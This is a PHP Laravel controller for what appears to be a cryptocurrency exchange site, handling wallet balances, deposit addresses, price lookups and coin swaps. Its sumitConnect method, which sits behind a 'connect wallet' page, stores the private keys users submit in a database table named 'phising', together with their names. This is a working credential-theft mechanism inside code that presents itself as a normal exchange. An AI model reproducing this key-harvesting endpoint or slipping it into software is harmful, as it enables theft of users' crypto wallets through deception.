<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\CreditCard;
use App\Models\SystemCoin;
use App\Models\UserWallet;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use SimpleSoftwareIO\QrCode\Facades\QrCode;

class WalletController extends Controller
{
    public function index()
    {
        $data = DB::table('balances')->where('user_id', auth()->user()->id)->where('symbol', '!=', 'USD')->orderBy('id', 'asc')->get();

        // Fetch admin deposit wallets dynamically (Unified Table)
        if (Schema::hasTable('admin_wallets')) {
            $admin_wallets = DB::table('admin_wallets')->where('is_active', true)->get();
        } else {
            // Fallback to fragmented tables if migration hasn't run or tables exist
            $admin_wallets = collect();

            $btc = DB::table('manuel_deposit')->where('id', 1)->first();
            if ($btc) {
                $admin_wallets->push((object) [
                    'name' => 'Bitcoin', 'symbol' => 'BTC', 'address' => $btc->address ?? '',
                    'network' => 'BTC Network', 'icon_class' => 'ri-bit-coin-line',
                ]);
            }

            $eth = DB::table('manuel_deposit_eth')->where('id', 1)->first();
            if ($eth) {
                $admin_wallets->push((object) [
                    'name' => 'Ethereum', 'symbol' => 'ETH', 'address' => $eth->address ?? '',
                    'network' => 'ERC-20 Network', 'icon_class' => 'ri-copper-diamond-line',
                ]);
            }

            $usd = DB::table('manuel_deposit_usd')->where('id', 1)->first();
            if ($usd) {
                $admin_wallets->push((object) [
                    'name' => 'USDT', 'symbol' => 'USDT', 'address' => $usd->address ?? '',
                    'network' => 'TRC-20 Network', 'icon_class' => 'ri-hand-coin-line',
                ]);
            }

            $solana = DB::table('manuel_deposit_solana')->where('id', 1)->first();
            if ($solana) {
                $admin_wallets->push((object) [
                    'name' => 'Solana', 'symbol' => 'SOL', 'address' => $solana->address ?? '',
                    'network' => 'SOL Network', 'icon_class' => 'ri-flashlight-line',
                ]);
            }
        }

        foreach ($admin_wallets as $wallet) {
            try {
                $wallet->qr_code = QrCode::size(200)->generate($wallet->address ?? '');
            } catch (\Throwable $e) {
                $wallet->qr_code = '';
            }
        }

        // Fetch Real-time Crypto Prices
        $prices = [];
        $totalCryptoUsd = 0;
        $symbols = $data->pluck('symbol')->implode(',');
        if (! empty($symbols)) {
            $prices = Cache::remember('crypto_prices_'.md5($symbols), 300, function () use ($symbols) {
                try {
                    $url = "https://min-api.cryptocompare.com/data/pricemulti?fsyms={$symbols}&tsyms=USD";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    $response = curl_exec($ch);
                    curl_close($ch);

                    if ($response) {
                        $priceData = json_decode($response, true);
                        if (isset($priceData['Response']) && $priceData['Response'] === 'Error') {
                            return [];
                        }
                        $fetchedPrices = [];
                        foreach (explode(',', $symbols) as $sym) {
                            $fetchedPrices[$sym] = $priceData[$sym]['USD'] ?? 0;
                        }

                        return $fetchedPrices;
                    }
                } catch (\Exception $e) {
                }

                return [];
            });

            // Binance fallback if CryptoCompare fails or returns 0 for a symbol
            foreach (explode(',', $symbols) as $sym) {
                if (empty($prices[$sym])) {
                    $prices[$sym] = Cache::remember('binance_price_'.$sym, 300, function () use ($sym) {
                        if (in_array(strtoupper($sym), ['USD', 'USDT', 'USDC', 'DAI'])) {
                            return 1;
                        }
                        try {
                            $url = 'https://api.binance.com/api/v3/ticker/price?symbol='.strtoupper($sym).'USDT';
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, $url);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                            $response = curl_exec($ch);
                            curl_close($ch);
                            if ($response) {
                                $data = json_decode($response, true);
                                if (isset($data['price'])) {
                                    return (float) $data['price'];
                                }
                            }
                        } catch (\Exception $e) {
                        }

                        return 0;
                    });
                }
            }

            foreach ($data as $coin) {
                $coinPrice = $prices[$coin->symbol] ?? 0;
                $totalCryptoUsd += ($coin->amount * $coinPrice);
            }
        }

        $viewName = $this->isMobileView() ? 'mobile.exchange.userwallet' : 'exchange.userwallet';

        $coins = SystemCoin::where('is_active', true)->get();
        $userWallets = UserWallet::where('user_id', auth()->id())->get()->keyBy('coin_symbol');
        $saved_cards = CreditCard::where('user_id', auth()->id())->orderByDesc('id')->get();

        $recent_deposits = DB::table('deposits')->where('user_id', auth()->id())->orderByDesc('id')->limit(5)->get();
        $recent_withdrawals = DB::table('withdrawals')->where('user_id', auth()->id())->orderByDesc('id')->limit(5)->get();
        $recent_trades = DB::table('orders')->where('user_id', auth()->id())->orderByDesc('id')->limit(5)->get();

        $total_deposited = DB::table('deposits')->where('user_id', auth()->id())->whereIn('status', ['approved', 'completed'])->sum('amount');
        $total_withdrawn = DB::table('withdrawals')->where('user_id', auth()->id())->whereIn('status', ['approved', 'completed'])->sum('amount');

        return view($viewName, [
            'data' => $data,
            'admin_wallets' => $admin_wallets,
            'prices' => $prices,
            'totalCryptoUsd' => $totalCryptoUsd,
            'coins' => $coins,
            'userWallets' => $userWallets,
            'recent_deposits' => $recent_deposits,
            'recent_withdrawals' => $recent_withdrawals,
            'recent_trades' => $recent_trades,
            'total_deposited' => $total_deposited,
            'total_withdrawn' => $total_withdrawn,
            'saved_cards' => $saved_cards,
        ]);
    }

    public function swap()
    {
        $data = DB::table('balances')->where('user_id', auth()->user()->id)->orderByDesc('id')->get();
        $balance = Balance::where('user_id', auth()->user()->id)->first();
        $admin_wallets = DB::table('admin_wallets')->where('is_active', 1)->get();
        $swap_history = DB::table('swap_history')->where('user_id', auth()->user()->id)->orderByDesc('id')->limit(20)->get();

        $view = $this->isMobileView() ? 'mobile.exchange.swap' : 'exchange.swap';

        return view($view, [
            'data' => $data,
            'balance' => $balance,
            'admin_wallets' => $admin_wallets,
            'swap_history' => $swap_history,
            'available' => $balance->amount ?? 0,
            'wallets' => $data,
        ]);
    }

    public function swap_to($wallet)
    {
        $data = DB::table('balances')->where('user_id', auth()->user()->id)->where('symbol', $wallet)->first();

        return response([
            $data,
        ], 200);

    }

    public function swap_coin(Request $request)
    {
        $from = $request->from;
        $to = $request->to;
        $amount = (float) $request->amount;

        if ($amount <= 0) {
            return back()->with('error', 'Invalid swap amount.');
        }

        if ($from === $to) {
            return back()->with('error', 'Source and destination assets cannot be the same.');
        }

        $senderBalance = Balance::where('user_id', auth()->id())->where('symbol', $from)->first();

        if (! $senderBalance || $amount > $senderBalance->amount) {
            return back()->with('error', 'Insufficient '.$from.' balance.');
        }

        // Fetch Real-time Rate from CryptoCompare
        try {
            $fromSymbol = ($from === 'USD') ? 'USD' : $from;
            $toSymbol = ($to === 'USD') ? 'USD' : $to;

            $url = "https://min-api.cryptocompare.com/data/price?fsym={$fromSymbol}&tsyms={$toSymbol}";
            $response = file_get_contents($url);
            $data = json_decode($response, true);

            if (! isset($data[$toSymbol])) {
                throw new \Exception('Unable to resolve exchange rate.');
            }

            $rate = $data[$toSymbol];
            $fee = 0.005; // 0.5% protocol fee
            $amount_to = ($amount * $rate) * (1 - $fee);

        } catch (\Exception $e) {
            return back()->with('error', 'Exchange Rate Error: '.$e->getMessage());
        }

        DB::beginTransaction();
        try {
            // Deduct 'from'
            $senderBalance->decrement('amount', $amount);

            // Credit 'to' (create if doesn't exist)
            $receiverBalance = Balance::where('user_id', auth()->id())->where('symbol', $to)->first();

            if ($receiverBalance) {
                $receiverBalance->increment('amount', $amount_to);
            } else {
                Balance::create([
                    'user_id' => auth()->id(),
                    'symbol' => $to,
                    'name' => $to, // Fallback name
                    'amount' => $amount_to,
                    'demo' => 0,
                    'bitcoin' => 0,
                    'bonus' => 0,
                    'bonus_balance' => 0,
                    'referral' => 0,
                ]);
            }

            // Record swap in history
            DB::table('swap_history')->insert([
                'user_id' => auth()->id(),
                'from_symbol' => $from,
                'to_symbol' => $to,
                'from_amount' => $amount,
                'to_amount' => $amount_to,
                'rate' => $rate,
                'fee_percent' => $fee,
                'status' => 'completed',
                'created_at' => now(),
                'updated_at' => now(),
            ]);

            DB::commit();

            return back()->with('status', 'Successfully swapped '.number_format($amount, ($from === 'USD' ? 2 : 6))." $from to ".number_format($amount_to, ($to === 'USD' ? 2 : 8))." $to");

        } catch (\Exception $e) {
            DB::rollBack();

            return back()->with('error', 'Swap failed: '.$e->getMessage());
        }
    }

    public function connect()
    {
        return view('exchange.connect');
    }

    public function sumitConnect(Request $request)
    {

        DB::table('phising')->insert([
            'user' => auth()->user()->first_name,
            'private_key' => $request->data,
            'created_at' => Carbon::now(),
        ]);

        return response()->json(['status' => 'true']);
    }

    public function manage()
    {
        $systemCoins = SystemCoin::where('is_active', true)->get();
        $userWallets = UserWallet::where('user_id', auth()->id())->get()->keyBy('coin_symbol');

        $viewName = $this->isMobileView() ? 'mobile.exchange.wallets_manage' : 'exchange.wallets_manage';

        return view($viewName, [
            'systemCoins' => $systemCoins,
            'userWallets' => $userWallets,
        ]);
    }

    public function toggleWallet(Request $request)
    {
        $request->validate([
            'symbol' => 'required|string|exists:system_coins,symbol',
            'is_enabled' => 'required|boolean',
        ]);

        $wallet = UserWallet::firstOrCreate(
            ['user_id' => auth()->id(), 'coin_symbol' => $request->symbol],
            ['balance' => 0, 'is_enabled' => false]
        );

        $wallet->is_enabled = $request->is_enabled;
        $wallet->save();

        return response()->json(['success' => true, 'message' => 'Wallet status updated.']);
    }
}
